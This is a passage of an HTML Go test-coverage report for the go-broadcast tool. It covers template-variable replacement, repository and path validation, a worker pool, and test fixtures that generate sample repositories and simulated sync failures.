        if len(params) == 0 </span><span class="cov8" title="1">{
                return baseURL
        }</span>

        // Estimate size: baseURL + "?" + params
        <span class="cov8" title="1">totalSize := len(baseURL) + 1 // baseURL + "?"
        for key, value := range params </span><span class="cov8" title="1">{
                totalSize += len(key) + 1 + len(value) + 1 // key=value&amp;
        }</span>

        <span class="cov8" title="1">var sb strings.Builder
        sb.Grow(totalSize)

        sb.WriteString(baseURL)
        sb.WriteByte('?')

        first := true
        for key, value := range params </span><span class="cov8" title="1">{
                if !first </span><span class="cov8" title="1">{
                        sb.WriteByte('&amp;')
                }</span>
                <span class="cov8" title="1">sb.WriteString(key)
                sb.WriteByte('=')
                sb.WriteString(value)
                first = false</span>
        }

        <span class="cov8" title="1">return sb.String()</span>
}

// BuildProgressMessage constructs a progress message with current/total counts.
//
// Parameters:
// - current: Current progress count
// - total: Total expected count
// - operation: Description of the operation
//
// Returns:
// - Formatted progress message
//
// Example:
//
//        msg := BuildProgressMessage(5, 10, "repositories processed")
//        // Result: "5/10 repositories processed"
func BuildProgressMessage(current, total int, operation string) string <span class="cov8" title="1">{
        currentStr := strconv.Itoa(current)
        totalStr := strconv.Itoa(total)

        // Size: current + "/" + total + " " + operation
        totalSize := len(currentStr) + 1 + len(totalStr) + 1 + len(operation)

        var sb strings.Builder
        sb.Grow(totalSize)

        sb.WriteString(currentStr)
        sb.WriteByte('/')
        sb.WriteString(totalStr)
        sb.WriteByte(' ')
        sb.WriteString(operation)

        return sb.String()
}</span>
</pre>

		<pre class="file" id="file85" style="display: none">package transform

import (
        "fmt"
        "regexp"
        "strings"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/logging"
)

// templateTransformer replaces template variables in content
type templateTransformer struct {
        logger    *logrus.Logger
        logConfig *logging.LogConfig
}

// NewTemplateTransformer creates a new template variable transformer.
//
// Parameters:
// - logger: Logger instance for general logging
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - Transformer interface implementation for template variable replacement
func NewTemplateTransformer(logger *logrus.Logger, logConfig *logging.LogConfig) Transformer <span class="cov8" title="1">{
        return &amp;templateTransformer{
                logger:    logger,
                logConfig: logConfig,
        }
}</span>

// Name returns the name of this transformer
func (t *templateTransformer) Name() string <span class="cov8" title="1">{
        return "template-variable-replacer"
}</span>

// Transform replaces template variables in the content with comprehensive debug logging support.
//
// This method provides detailed visibility into template transformation when debug logging is enabled,
// including before/after content, variable substitution details, timing metrics, and content size analysis.
//
// Parameters:
// - content: The original file content to transform
// - ctx: Transform context containing variables and configuration
//
// Returns:
// - Transformed content as byte slice
// - Error if transformation fails
//
// Side Effects:
// - Logs detailed transformation information when --debug-transform flag is enabled
// - Records transformation timing and content size metrics
func (t *templateTransformer) Transform(content []byte, ctx Context) ([]byte, error) <span class="cov8" title="1">{
        logger := logging.WithStandardFields(t.logger, t.logConfig, logging.ComponentNames.Transform)
        start := time.Now()

        // Debug logging when --debug-transform flag is enabled
        if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.Operation:     logging.OperationTypes.FileTransform,
                        logging.StandardFields.FilePath:      ctx.FilePath,
                        logging.StandardFields.SourceRepo:    ctx.SourceRepo,
                        logging.StandardFields.TargetRepo:    ctx.TargetRepo,
                        logging.StandardFields.VariableCount: len(ctx.Variables),
                        logging.StandardFields.ContentSize:   len(content),
                }).Debug("Starting template transformation")

                // Log original content for small files (with size limits)
                if len(content) &gt; 0 &amp;&amp; len(content) &lt; 2048 </span><span class="cov8" title="1">{
                        logger.WithField("content", string(content)).Trace("Original content")
                }</span>

                // Log available variables
                <span class="cov8" title="1">if len(ctx.Variables) &gt; 0 </span><span class="cov8" title="1">{
                        for varName, value := range ctx.Variables </span><span class="cov8" title="1">{
                                logger.WithFields(logrus.Fields{
                                        logging.StandardFields.Variable:      varName,
                                        logging.StandardFields.VariableValue: value,
                                }).Trace("Available variable")
                        }</span>
                }
        }

        <span class="cov8" title="1">if len(ctx.Variables) == 0 </span><span class="cov8" title="1">{
                // Log completion for empty variable case
                if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov8" title="1">{
                        duration := time.Since(start)
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.DurationMs: duration.Milliseconds(),
                                "changes":                         0,
                                logging.StandardFields.Status:     "completed_no_variables",
                        }).Debug("Template transformation completed (no variables)")
                }</span>
                <span class="cov8" title="1">return content, nil</span>
        }

        <span class="cov8" title="1">result := string(content)
        replacedVars := make([]string, 0)
        replacementCount := 0

        // Sort variables by length (longest first) to avoid partial replacements
        // e.g., replace {{SERVICE_NAME}} before {{SERVICE}}
        varKeys := make([]string, 0, len(ctx.Variables))
        for k := range ctx.Variables </span><span class="cov8" title="1">{
                varKeys = append(varKeys, k)
        }</span>

        // Simple bubble sort by length (descending)
        <span class="cov8" title="1">for i := 0; i &lt; len(varKeys); i++ </span><span class="cov8" title="1">{
                for j := i + 1; j &lt; len(varKeys); j++ </span><span class="cov8" title="1">{
                        if len(varKeys[j]) &gt; len(varKeys[i]) </span><span class="cov8" title="1">{
                                varKeys[i], varKeys[j] = varKeys[j], varKeys[i]
                        }</span>
                }
        }

        // Replace each variable
        <span class="cov8" title="1">for _, varName := range varKeys </span><span class="cov8" title="1">{
                value := ctx.Variables[varName]

                // Support both {{VAR}} and ${VAR} syntax
                patterns := []string{
                        fmt.Sprintf("{{%s}}", varName),
                        fmt.Sprintf("${%s}", varName),
                }

                replaced := false
                patternReplacements := 0

                for _, pattern := range patterns </span><span class="cov8" title="1">{
                        // Escape special regex characters in the pattern
                        escapedPattern := regexp.QuoteMeta(pattern)
                        re := regexp.MustCompile(escapedPattern)

                        oldResult := result
                        result = re.ReplaceAllLiteralString(result, value)

                        if result != oldResult </span><span class="cov8" title="1">{
                                replaced = true
                                // Count replacements for this pattern
                                currentReplacements := strings.Count(oldResult, pattern)
                                patternReplacements += currentReplacements
                        }</span>
                }

                <span class="cov8" title="1">if replaced </span><span class="cov8" title="1">{
                        replacedVars = append(replacedVars, varName)
                        replacementCount += patternReplacements

                        // Debug logging for individual variable replacements
                        if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov8" title="1">{
                                logger.WithFields(logrus.Fields{
                                        logging.StandardFields.Variable:      varName,
                                        logging.StandardFields.VariableValue: value,
                                        logging.StandardFields.Replacements:  patternReplacements,
                                }).Trace("Variable substitution")
                        }</span>
                }
        }

        // Calculate transformation timing and metrics
        <span class="cov8" title="1">duration := time.Since(start)
        contentSizeChange := len(result) - len(content)

        if len(replacedVars) &gt; 0 </span><span class="cov8" title="1">{
                if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov8" title="1">{
                        // Transformation completion logging
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.FilePath:   ctx.FilePath,
                                "variables":                       strings.Join(replacedVars, ", "),
                                "total_replacements":              replacementCount,
                                logging.StandardFields.DurationMs: duration.Milliseconds(),
                                logging.StandardFields.SizeChange: contentSizeChange,
                                "original_size":                   len(content),
                                "final_size":                      len(result),
                                logging.StandardFields.Status:     "completed",
                        }).Debug("Template variables replaced")

                        // Log final content for small files (with size limits)
                        if len(result) &gt; 0 &amp;&amp; len(result) &lt; 2048 </span><span class="cov0" title="0">{
                                logger.WithField("content", result).Trace("Transformed content")
                        }</span>
                } else<span class="cov8" title="1"> {
                        // Basic logging for backwards compatibility
                        t.logger.WithFields(logrus.Fields{
                                logging.StandardFields.Component: logging.ComponentNames.Transform,
                                logging.StandardFields.FilePath:  ctx.FilePath,
                                "variables":                      strings.Join(replacedVars, ", "),
                                logging.StandardFields.Status:    "completed",
                        }).Debug("Replaced template variables")
                }</span>
        } else<span class="cov8" title="1"> {
                // Log completion for no replacements case
                if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.DurationMs: duration.Milliseconds(),
                                "changes":                         0,
                                logging.StandardFields.Status:     "completed_no_replacements",
                        }).Debug("Template transformation completed (no replacements)")
                }</span>
        }

        // Check for any remaining unreplaced variables and log warnings
        <span class="cov8" title="1">remainingVars := t.findUnreplacedVariables(result)
        if len(remainingVars) &gt; 0 </span><span class="cov8" title="1">{
                if t.logConfig != nil &amp;&amp; t.logConfig.Debug.Transform </span><span class="cov0" title="0">{
                        // Unreplaced variable warning
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.FilePath: ctx.FilePath,
                                "unreplaced_vars":               strings.Join(remainingVars, ", "),
                                "available_vars":                strings.Join(varKeys, ", "),
                                "unreplaced_count":              len(remainingVars),
                                logging.StandardFields.Status:   "warning_unreplaced_vars",
                        }).Warn("Found unreplaced template variables")
                }</span> else<span class="cov8" title="1"> {
                        // Basic logging for backwards compatibility
                        t.logger.WithFields(logrus.Fields{
                                logging.StandardFields.Component: logging.ComponentNames.Transform,
                                logging.StandardFields.FilePath:  ctx.FilePath,
                                "unreplaced_vars":                strings.Join(remainingVars, ", "),
                                "available_vars":                 strings.Join(varKeys, ", "),
                                logging.StandardFields.Status:    "warning_unreplaced_vars",
                        }).Warn("Found unreplaced template variables")
                }</span>
        }

        <span class="cov8" title="1">return []byte(result), nil</span>
}

// findUnreplacedVariables finds any remaining template variables in the content
func (t *templateTransformer) findUnreplacedVariables(content string) []string <span class="cov8" title="1">{
        vars := make(map[string]bool)

        // Find {{VAR}} style variables
        re1 := regexp.MustCompile(`\{\{([A-Z_][A-Z0-9_]*)\}\}`)

        matches1 := re1.FindAllStringSubmatch(content, -1)
        for _, match := range matches1 </span><span class="cov8" title="1">{
                if len(match) &gt; 1 </span><span class="cov8" title="1">{
                        vars[match[1]] = true
                }</span>
        }

        // Find ${VAR} style variables
        <span class="cov8" title="1">re2 := regexp.MustCompile(`\$\{([A-Z_][A-Z0-9_]*)\}`)

        matches2 := re2.FindAllStringSubmatch(content, -1)
        for _, match := range matches2 </span><span class="cov8" title="1">{
                if len(match) &gt; 1 </span><span class="cov8" title="1">{
                        vars[match[1]] = true
                }</span>
        }

        // Convert map to slice
        <span class="cov8" title="1">result := make([]string, 0, len(vars))
        for v := range vars </span><span class="cov8" title="1">{
                result = append(result, v)
        }</span>

        <span class="cov8" title="1">return result</span>
}
</pre>

		<pre class="file" id="file86" style="display: none">// Package validation provides shared validation utilities and patterns used throughout the application.
// This package consolidates validation logic that was previously scattered across multiple packages.
package validation

import (
        "fmt"
        "path/filepath"
        "regexp"
        "strings"

        "github.com/mrz1836/go-broadcast/internal/errors"
)

// Validation patterns compiled once for efficiency
var (
        // repoNamePattern validates repository names in org/repo format
        repoNamePattern = regexp.MustCompile(`^[a-zA-Z0-9][\w.-]*/[a-zA-Z0-9][\w.-]*$`)

        // branchNamePattern validates branch names with allowed characters
        branchNamePattern = regexp.MustCompile(`^[a-zA-Z0-9][\w./\-]*$`)

        // branchPrefixPattern validates branch prefixes (same as branch names)
        branchPrefixPattern = regexp.MustCompile(`^[a-zA-Z0-9][\w./\-]*$`)
)

// ValidateRepoName validates repository name format.
// Expects org/repo format and ensures no path traversal attempts.
func ValidateRepoName(name string) error <span class="cov8" title="1">{
        if name == "" </span><span class="cov8" title="1">{
                return errors.EmptyFieldError("repository name")
        }</span>

        <span class="cov8" title="1">if !repoNamePattern.MatchString(name) </span><span class="cov8" title="1">{
                return errors.FormatError("repository name", name, "org/repo")
        }</span>

        <span class="cov8" title="1">if strings.Contains(name, "..") </span><span class="cov8" title="1">{
                return errors.PathTraversalError(name)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// ValidateBranchName validates branch name format.
// Ensures branch names contain only allowed characters.
func ValidateBranchName(name string) error <span class="cov8" title="1">{
        if name == "" </span><span class="cov8" title="1">{
                return errors.EmptyFieldError("branch name")
        }</span>

        <span class="cov8" title="1">if !branchNamePattern.MatchString(name) </span><span class="cov8" title="1">{
                return errors.InvalidFieldError("branch name", name)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// ValidateBranchPrefix validates branch prefix format.
// Uses the same rules as branch names but allows empty values.
func ValidateBranchPrefix(prefix string) error <span class="cov8" title="1">{
        // Empty prefix is allowed (will use default)
        if prefix == "" </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">if !branchPrefixPattern.MatchString(prefix) </span><span class="cov8" title="1">{
                return errors.InvalidFieldError("branch prefix", prefix)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// ValidateFilePath validates file paths for security and format.
// Ensures paths are relative and don't escape the repository via path traversal.
func ValidateFilePath(path, fieldName string) error <span class="cov8" title="1">{
        if path == "" </span><span class="cov8" title="1">{
                return errors.RequiredFieldError(fieldName + " path")
        }</span>

        // Clean the path and check for security issues
        <span class="cov8" title="1">cleanPath := filepath.Clean(path)

        // Check for absolute paths
        if filepath.IsAbs(cleanPath) </span><span class="cov8" title="1">{
                return errors.ValidationError(fieldName+" path", "must be relative, not absolute")
        }</span>

        // Check for path traversal attempts
        <span class="cov8" title="1">if strings.HasPrefix(cleanPath, "..") </span><span class="cov8" title="1">{
                return errors.PathTraversalError(path)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// ValidateNonEmpty validates that a string field is not empty or whitespace-only.
// This is commonly used for required string fields.
func ValidateNonEmpty(field, value string) error <span class="cov8" title="1">{
        if strings.TrimSpace(value) == "" </span><span class="cov8" title="1">{
                return errors.EmptyFieldError(field)
        }</span>
        <span class="cov8" title="1">return nil</span>
}

// SanitizeInput performs basic input sanitization for string values.
// Trims whitespace and can be extended with additional sanitization rules.
func SanitizeInput(input string) string <span class="cov8" title="1">{
        return strings.TrimSpace(input)
}</span>

// Result represents the result of a validation operation.
type Result struct {
        Valid  bool
        Errors []error
}

// AddError adds an error to the validation result.
func (vr *Result) AddError(err error) <span class="cov8" title="1">{
        if err != nil </span><span class="cov8" title="1">{
                vr.Valid = false
                vr.Errors = append(vr.Errors, err)
        }</span>
}

// FirstError returns the first validation error or nil if valid.
func (vr *Result) FirstError() error <span class="cov8" title="1">{
        if len(vr.Errors) &gt; 0 </span><span class="cov8" title="1">{
                return vr.Errors[0]
        }</span>
        <span class="cov8" title="1">return nil</span>
}

// AllErrors returns all validation errors as a single combined error.
func (vr *Result) AllErrors() error <span class="cov8" title="1">{
        if len(vr.Errors) == 0 </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">if len(vr.Errors) == 1 </span><span class="cov8" title="1">{
                return vr.Errors[0]
        }</span>

        // Combine multiple errors
        <span class="cov8" title="1">messages := make([]string, 0, len(vr.Errors))
        for _, err := range vr.Errors </span><span class="cov8" title="1">{
                messages = append(messages, err.Error())
        }</span>

        <span class="cov8" title="1">return errors.ValidationError("multiple fields", strings.Join(messages, "; "))</span>
}

// NewValidationResult creates a new validation result initialized as valid.
func NewValidationResult() *Result <span class="cov8" title="1">{
        return &amp;Result{
                Valid:  true,
                Errors: make([]error, 0),
        }
}</span>

// ValidateSourceConfig validates source repository configuration.
// This consolidates validation logic from config package.
func ValidateSourceConfig(repo, branch string) error <span class="cov8" title="1">{
        result := NewValidationResult()

        result.AddError(ValidateRepoName(repo))
        result.AddError(ValidateBranchName(branch))

        return result.FirstError()
}</span>

// ValidateTargetConfig validates target repository configuration.
// This consolidates validation logic for target repositories.
func ValidateTargetConfig(repo string, fileMappings []FileMapping) error <span class="cov8" title="1">{
        result := NewValidationResult()

        // Validate repository name
        result.AddError(ValidateRepoName(repo))

        // Validate file mappings
        if len(fileMappings) == 0 </span><span class="cov8" title="1">{
                result.AddError(errors.ValidationError("target repository", "at least one file mapping is required"))
        }</span>

        // Check for duplicate destinations
        <span class="cov8" title="1">seenDest := make(map[string]bool)
        for i, mapping := range fileMappings </span><span class="cov8" title="1">{
                result.AddError(ValidateFileMapping(mapping))

                if seenDest[mapping.Dest] </span><span class="cov8" title="1">{
                        result.AddError(errors.ValidationError("file mappings", "duplicate destination: "+mapping.Dest))
                }</span>
                <span class="cov8" title="1">seenDest[mapping.Dest] = true

                // Add context to errors for specific file mapping
                if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                        lastErr := result.Errors[len(result.Errors)-1]
                        result.Errors[len(result.Errors)-1] = errors.WrapWithContext(lastErr, fmt.Sprintf("validate file mapping[%d]", i))
                }</span>
        }

        <span class="cov8" title="1">return result.FirstError()</span>
}

// FileMapping represents a file mapping for validation.
type FileMapping struct {
        Src  string
        Dest string
}

// ValidateFileMapping validates a single file mapping.
// This consolidates file mapping validation logic.
func ValidateFileMapping(mapping FileMapping) error <span class="cov8" title="1">{
        result := NewValidationResult()

        result.AddError(ValidateFilePath(mapping.Src, "source"))
        result.AddError(ValidateFilePath(mapping.Dest, "destination"))

        return result.FirstError()
}</span>
</pre>

		<pre class="file" id="file87" style="display: none">package worker

import (
        "context"
        "errors"
        "fmt"
        "sync"
        "sync/atomic"
        "time"
)

// Worker pool errors
var (
        ErrPoolShuttingDown = errors.New("pool is shutting down")
        ErrTaskQueueFull    = errors.New("task queue is full")
        ErrTaskPanicked     = errors.New("task panicked")
)

// Task represents a unit of work
type Task interface {
        Execute(ctx context.Context) error
        Name() string
}

// Result wraps task execution results
type Result struct {
        TaskName string
        Error    error
        Duration time.Duration
}

// Pool manages a pool of workers
type Pool struct {
        workers   int
        taskQueue chan Task
        results   chan Result
        wg        sync.WaitGroup
        cancel    context.CancelFunc

        // Metrics
        tasksProcessed atomic.Int64
        tasksActive    atomic.Int32
}

// NewPool creates a new worker pool
func NewPool(workers, queueSize int) *Pool <span class="cov8" title="1">{
        _, cancel := context.WithCancel(context.Background())

        return &amp;Pool{
                workers:   workers,
                taskQueue: make(chan Task, queueSize),
                results:   make(chan Result, queueSize),
                cancel:    cancel,
        }
}</span>

// Start begins processing tasks
func (p *Pool) Start(ctx context.Context) <span class="cov8" title="1">{
        for i := 0; i &lt; p.workers; i++ </span><span class="cov8" title="1">{
                p.wg.Add(1)
                go p.worker(ctx, i)
        }</span>
}

// Submit adds a task to the queue
func (p *Pool) Submit(task Task) error <span class="cov8" title="1">{
        select </span>{
        case p.taskQueue &lt;- task:<span class="cov8" title="1">
                return nil</span>
        default:<span class="cov8" title="1">
                return ErrTaskQueueFull</span>
        }
}

// SubmitBatch submits multiple tasks
func (p *Pool) SubmitBatch(tasks []Task) error <span class="cov8" title="1">{
        for _, task := range tasks </span><span class="cov8" title="1">{
                if err := p.Submit(task); err != nil </span><span class="cov8" title="1">{
                        return err
                }</span>
        }
        <span class="cov8" title="1">return nil</span>
}

// Results returns the results channel
func (p *Pool) Results() &lt;-chan Result <span class="cov8" title="1">{
        return p.results
}</span>

// Shutdown gracefully stops the pool
func (p *Pool) Shutdown() <span class="cov8" title="1">{
        close(p.taskQueue)
        p.wg.Wait()
        close(p.results)
}</span>

// Stats returns current pool statistics
func (p *Pool) Stats() (processed int64, active int32, queued int) <span class="cov8" title="1">{
        return p.tasksProcessed.Load(), p.tasksActive.Load(), len(p.taskQueue)
}</span>

// worker processes tasks from the queue
func (p *Pool) worker(ctx context.Context, _ int) <span class="cov8" title="1">{
        defer p.wg.Done()

        for task := range p.taskQueue </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return</span>
                default:<span class="cov8" title="1">
                        p.tasksActive.Add(1)
                        start := time.Now()

                        // Recover from panics to prevent worker crash
                        var err error
                        func() </span><span class="cov8" title="1">{
                                defer func() </span><span class="cov8" title="1">{
                                        if r := recover(); r != nil </span><span class="cov8" title="1">{
                                                err = fmt.Errorf("%w: %v", ErrTaskPanicked, r)
                                        }</span>
                                }()
                                <span class="cov8" title="1">err = task.Execute(ctx)</span>
                        }()

                        <span class="cov8" title="1">p.results &lt;- Result{
                                TaskName: task.Name(),
                                Error:    err,
                                Duration: time.Since(start),
                        }

                        p.tasksActive.Add(-1)
                        p.tasksProcessed.Add(1)</span>
                }
        }
}
</pre>

		<pre class="file" id="file88" style="display: none">// Package fixtures provides utilities for generating test data and scenarios
// for integration testing of the go-broadcast synchronization engine.
package fixtures

import (
        "context"
        "crypto/rand"
        "errors"
        "fmt"
        "os"
        "path/filepath"
        "strings"
        "time"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/state"
)

// TestRepoGenerator provides utilities for creating test repository scenarios
type TestRepoGenerator struct {
        BaseDir string
        TempDir string
}

// NewTestRepoGenerator creates a new test repository generator
func NewTestRepoGenerator(baseDir string) *TestRepoGenerator <span class="cov8" title="1">{
        return &amp;TestRepoGenerator{
                BaseDir: baseDir,
        }
}</span>

// TestScenario represents a complete test scenario with multiple repositories
type TestScenario struct {
        Name        string
        Description string
        SourceRepo  *TestRepository
        TargetRepos []*TestRepository
        Config      *config.Config
        State       *state.State
}

// TestRepository represents a test repository with its content and metadata
type TestRepository struct {
        Name        string
        Owner       string
        Branch      string
        CommitSHA   string
        Files       map[string][]byte
        Path        string
        HasConflict bool
        Size        int64 // Total size in bytes
}

// FailureMode defines types of failures that can be injected into tests
type FailureMode int

const (
        // FailureNone indicates no failure should be injected
        FailureNone FailureMode = iota
        // FailureNetwork indicates network-related failures
        FailureNetwork
        // FailureAuth indicates authentication failures
        FailureAuth
        // FailureRateLimit indicates rate limiting failures
        FailureRateLimit
        // FailurePartial indicates partial operation failures
        FailurePartial
        // FailureCorruption indicates data corruption failures
        FailureCorruption
        // FailureTimeout indicates timeout failures
        FailureTimeout
)

// Static error definitions for test fixtures
var (
        ErrNetworkTimeout       = errors.New("network error: connection timeout")
        ErrAuthenticationFailed = errors.New("authentication failed: invalid credentials")
        ErrRateLimitExceeded    = errors.New("rate limit exceeded: too many requests")
        ErrPartialFailure       = errors.New("partial failure: some operations failed")
        ErrDataCorruption       = errors.New("data corruption detected")
        ErrOperationTimeout     = errors.New("operation timeout")
        ErrUnknownFailure       = errors.New("unknown failure")
        ErrNetworkPartition     = errors.New("network partition: connection refused")
        ErrBranchProtection     = errors.New("branch protection: direct pushes not allowed")
        ErrPushRejected         = errors.New("push failed: remote rejected")
        ErrUnauthorized         = errors.New("401 Unauthorized: bad credentials")
        ErrForbidden            = errors.New("403 Forbidden: insufficient permissions")
        ErrFileNotFound         = errors.New("file not found")
        ErrNetworkFailure       = errors.New("simulated network failure")
        ErrGitCloneFailed       = errors.New("git clone failed")
        ErrNetworkRefused       = errors.New("network error: connection refused")
        ErrNetworkUnreachable   = errors.New("git clone failed: network unreachable")
        ErrGitPushTimeout       = errors.New("git push failed: connection timeout")
        ErrGitAuthRequired      = errors.New("git clone failed: authentication required")
        ErrGitPermissionDenied  = errors.New("git push failed: permission denied")
        ErrRequestTimeout       = errors.New("request timeout")
        ErrServiceDegradation   = errors.New("partial service degradation")
        ErrSSLCertificate       = errors.New("git clone failed: x509: certificate signed by unknown authority")
        ErrProxyConnection      = errors.New("git clone failed: proxy connection failed (407 Proxy Authentication Required)")
)

// CreateRepo generates a test repository with the specified files
func (g *TestRepoGenerator) CreateRepo(name, owner, branch string, files map[string]string) (*TestRepository, error) <span class="cov8" title="1">{
        repoPath := filepath.Join(g.BaseDir, fmt.Sprintf("%s-%s", owner, name))

        // Create directory structure
        err := os.MkdirAll(repoPath, 0o750)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create repo directory: %w", err)
        }</span>

        // Convert string files to byte files and calculate total size
        <span class="cov8" title="1">byteFiles := make(map[string][]byte)
        var totalSize int64

        for path, content := range files </span><span class="cov8" title="1">{
                bytes := []byte(content)
                byteFiles[path] = bytes
                totalSize += int64(len(bytes))

                // Create file and its directory structure
                fullPath := filepath.Join(repoPath, path)
                dir := filepath.Dir(fullPath)

                err := os.MkdirAll(dir, 0o750)
                if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("failed to create directory %s: %w", dir, err)
                }</span>

                <span class="cov8" title="1">err = os.WriteFile(fullPath, bytes, 0o600)
                if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("failed to write file %s: %w", fullPath, err)
                }</span>
        }

        <span class="cov8" title="1">return &amp;TestRepository{
                Name:      name,
                Owner:     owner,
                Branch:    branch,
                CommitSHA: generateCommitSHA(),
                Files:     byteFiles,
                Path:      repoPath,
                Size:      totalSize,
        }, nil</span>
}

// CreateLargeFileRepo creates a repository with large files for testing memory usage
func (g *TestRepoGenerator) CreateLargeFileRepo(name, owner string, fileSizeMB int) (*TestRepository, error) <span class="cov8" title="1">{
        files := make(map[string]string)

        // Create a large file
        largeContent := make([]byte, fileSizeMB*1024*1024)
        for i := range largeContent </span><span class="cov8" title="1">{
                largeContent[i] = byte('A' + (i % 26))
        }</span>

        <span class="cov8" title="1">files[fmt.Sprintf("large_file_%dmb.txt", fileSizeMB)] = string(largeContent)
        files["README.md"] = fmt.Sprintf("# Large File Test Repository\n\nThis repository contains a %dMB test file.", fileSizeMB)
        files[".github/workflows/ci.yml"] = getStandardCIWorkflow()

        return g.CreateRepo(name, owner, "master", files)</span>
}

// CreateConflictingRepo creates a repository that will have conflicts when synced
func (g *TestRepoGenerator) CreateConflictingRepo(name, owner string) (*TestRepository, error) <span class="cov8" title="1">{
        files := map[string]string{
                "README.md": fmt.Sprintf("# %s\n\nThis file has been modified in the target repo and will conflict.", name),
                ".github/workflows/ci.yml": `name: CI (Modified)
on:
  push:
    branches: [ master, development ]
  pull_request:
    branches: [ master ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Run custom tests
      run: echo "Custom test for target repo"`,
                "Makefile": `# Modified Makefile for target repo
.PHONY: test build
test:
        go test -v ./...
build:
        go build -o bin/app ./cmd/app`,
        }

        repo, err := g.CreateRepo(name, owner, "master", files)
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        <span class="cov8" title="1">repo.HasConflict = true
        return repo, nil</span>
}

// CreateComplexScenario generates a multi-repository test scenario
func (g *TestRepoGenerator) CreateComplexScenario() (*TestScenario, error) <span class="cov8" title="1">{
        // Create source repository
        sourceFiles := map[string]string{
                "README.md":                     "# Template Repository\n\nThis is the source template for synchronization.",
                ".github/workflows/ci.yml":      getStandardCIWorkflow(),
                ".github/workflows/release.yml": getStandardReleaseWorkflow(),
                "Makefile":                      getStandardMakefile(),
                "docker-compose.yml":            getStandardDockerCompose(),
                "scripts/setup.sh":              getStandardSetupScript(),
                "docs/API.md":                   "# API Documentation\n\nTemplate API documentation.",
        }

        sourceRepo, err := g.CreateRepo("template-repo", "org", "master", sourceFiles)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create source repo: %w", err)
        }</span>

        // Create target repositories with varying scenarios
        <span class="cov8" title="1">var targetRepos []*TestRepository

        // Normal target repo
        normalRepo, err := g.CreateRepo("service-a", "org", "master", map[string]string{
                "README.md": "# Service A\n\nA microservice.",
                "main.go":   "package main\n\nfunc main() {\n\tprintln(\"Service A\")\n}",
        })
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create normal target repo: %w", err)
        }</span>
        <span class="cov8" title="1">targetRepos = append(targetRepos, normalRepo)

        // Conflicting target repo
        conflictRepo, err := g.CreateConflictingRepo("service-b", "org")
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create conflicting target repo: %w", err)
        }</span>
        <span class="cov8" title="1">targetRepos = append(targetRepos, conflictRepo)

        // Large file target repo
        largeRepo, err := g.CreateLargeFileRepo("service-c", "org", 50) // 50MB file
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create large file target repo: %w", err)
        }</span>
        <span class="cov8" title="1">targetRepos = append(targetRepos, largeRepo)

        // Create configuration (supports both old and new format)
        cfg := g.GenerateTestConfig("org/template-repo", "master", targetRepos)

        // Create state
        currentState := &amp;state.State{
                Source: state.SourceState{
                        Repo:         "org/template-repo",
                        Branch:       "master",
                        LatestCommit: sourceRepo.CommitSHA,
                        LastChecked:  time.Now(),
                },
                Targets: make(map[string]*state.TargetState),
        }

        // Set target states (some outdated, some up-to-date)
        for i, target := range targetRepos </span><span class="cov8" title="1">{
                status := state.StatusBehind
                lastSyncCommit := "old" + generateCommitSHA()[:10]

                // Make first repo up-to-date for variety
                if i == 0 </span><span class="cov8" title="1">{
                        status = state.StatusUpToDate
                        lastSyncCommit = sourceRepo.CommitSHA
                }</span>

                <span class="cov8" title="1">currentState.Targets[fmt.Sprintf("org/%s", target.Name)] = &amp;state.TargetState{
                        Repo:           fmt.Sprintf("org/%s", target.Name),
                        LastSyncCommit: lastSyncCommit,
                        Status:         status,
                        LastSyncTime:   &amp;[]time.Time{time.Now().Add(-time.Duration(i+1) * time.Hour)}[0],
                }</span>
        }

        <span class="cov8" title="1">return &amp;TestScenario{
                Name:        "Complex Multi-Repository Sync",
                Description: "Multi-repo scenario with normal, conflicting, and large file repositories",
                SourceRepo:  sourceRepo,
                TargetRepos: targetRepos,
                Config:      cfg,
                State:       currentState,
        }, nil</span>
}

// CreatePartialFailureScenario creates a scenario where some repos succeed and others fail
func (g *TestRepoGenerator) CreatePartialFailureScenario() (*TestScenario, error) <span class="cov8" title="1">{
        scenario, err := g.CreateComplexScenario()
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        <span class="cov8" title="1">scenario.Name = "Partial Failure Recovery"
        scenario.Description = "Scenario where sync partially fails and requires recovery"

        // Mark some targets as having conflicts
        for i, target := range scenario.TargetRepos </span><span class="cov8" title="1">{
                if i == 1 </span><span class="cov8" title="1">{ // Second repo will have conflicts
                        scenario.State.Targets[fmt.Sprintf("org/%s", target.Name)].Status = state.StatusConflict
                }</span>
        }

        <span class="cov8" title="1">return scenario, nil</span>
}

